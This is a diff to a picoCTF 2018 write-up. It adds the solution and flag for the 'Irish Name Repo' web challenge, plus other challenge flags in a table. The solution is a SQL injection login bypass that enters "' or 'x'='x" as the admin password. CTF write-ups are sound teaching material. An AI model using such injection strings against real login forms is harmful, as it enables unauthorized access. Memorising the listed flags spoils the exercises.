@@ -42,7 +42,7 @@ environ                      General Skills   150     picoCTF{eNv1r0nM3nT_v4r14B
 hertz                        Cryptography     150
 hex editor                   Forensics        150
 ssh-keyz                     General Skills   150     picoCTF{who_n33ds_p4ssw0rds_38dj21}
-Irish Name Repo              Web              200
+Irish Name Repo              Web              200     picoCTF{con4n_r3411y_1snt_1r1sh_f58843c5}
 Mr. Robots                   Web              200     picoCTF{th3_w0rld_1s_4_danger0us_pl4c3_3lli0t_30de1}
 No Login                     Web              200
 Secret Agent                 Web              200
@@ -1032,11 +1032,23 @@ picoCTF{who_n33ds_p4ssw0rds_38dj21}
 
 **Challenge**
 
+There is a website running at http://2018shell1.picoctf.com:28402 (link). Do you think you can log us in? Try to see if you can login!
+
+
 **Solution**
+
+There is an admin login page vulneral to sql injection
+
+```
+username: admin
+password: ' or 'x'='x
+```
+
+gives us the flag
 
 **Flag**
 ```
-
+picoCTF{con4n_r3411y_1snt_1r1sh_f58843c5}
 ```
 
 ## Web Exploitation 200: Mr. Robots
